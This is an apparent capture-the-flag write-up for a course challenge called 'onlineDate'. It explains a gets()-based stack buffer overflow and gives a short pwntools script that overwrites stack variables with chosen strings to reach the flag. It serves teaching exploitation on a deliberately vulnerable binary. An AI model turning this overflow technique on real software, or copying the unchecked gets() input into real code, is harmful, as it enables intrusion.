# onlineDate

### Description
What about updating your profile information?

### Rules
- Do not patch this binary.
- Do not modify or delete the flag.txt file.
- You MUST solve the challenge by providing valid inputs.
- You CANNOT just jump with the debugger to any function that directly prints the flag.
- If you think you're breaking these rules with your solution, please ask the teachers.

## Solution
We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 56 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

payload = b'A'* 56 + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

# r = gdb.debug('./onlineDating')
r = process('./onlineDating')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()
```

### Flag
```plain

```